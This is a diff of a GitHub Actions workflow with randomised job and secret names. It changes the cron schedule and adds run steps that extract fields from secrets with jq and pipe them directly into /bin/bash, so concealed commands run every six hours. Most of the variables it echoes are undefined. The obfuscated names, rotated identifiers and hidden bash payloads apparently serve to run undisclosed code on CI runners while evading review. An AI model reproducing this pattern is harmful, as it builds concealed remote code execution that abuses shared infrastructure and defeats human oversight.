@@ -3,29 +3,26 @@ name: yangziyuan1962
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 1/6 * * *'
+    - cron: '22 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yangziyuan1962
         env:
-          yqqti1: ${{ secrets.yqqti1 }}
+          m3: ${{ secrets.m3 }}
         run: |
-          echo $yqqti1 | jq -r .m4429 | /bin/bash
-          echo $vwk8126 | jq -r .rhb677 | /bin/bash
-          echo $kwg6291 | jq -r .qxz80 | /bin/bash
-          echo $owgd77096 | jq -r .hkfvd24220 | /bin/bash
-          echo $du2 | jq -r .newke743 | /bin/bash
-          echo $lxrox61 | jq -r .xqs1 | /bin/bash
-          echo $km95585 | jq -r .zbera605 | /bin/bash
-          echo $duk17 | jq -r .nujbf4228 | /bin/bash
-          echo $mee006 | jq -r .nxbdw523 | /bin/bash
-          echo $mbyvw313 | jq -r .uxlgp64 | /bin/bash
-          echo $brxak28800 | jq -r .mvqa5 | /bin/bash
-          echo $nvb57020 | jq -r .mqh34 | /bin/bash
-          echo $mxwvg47 | jq -r .a27022 | /bin/bash
+          echo $m3 | jq -r .ksve52 | /bin/bash
+          echo $dhvd55248 | jq -r .xzm345 | /bin/bash
+          echo $vdypm5013 | jq -r .qck729 | /bin/bash
+          echo $xctgc313 | jq -r .nuxhg1982 | /bin/bash
+          echo $dix8 | jq -r .ob957 | /bin/bash
+          echo $yeqs701 | jq -r .kn68323 | /bin/bash
+          echo $ogpdv62 | jq -r .fhjt971 | /bin/bash
+          echo $u47395 | jq -r .wxqs77482 | /bin/bash
+          echo $t3797 | jq -r .jjxjv71 | /bin/bash
+          echo $ebky7177 | jq -r .y0492 | /bin/bash
+          echo $w477 | jq -r .qyq2674 | /bin/bash
 
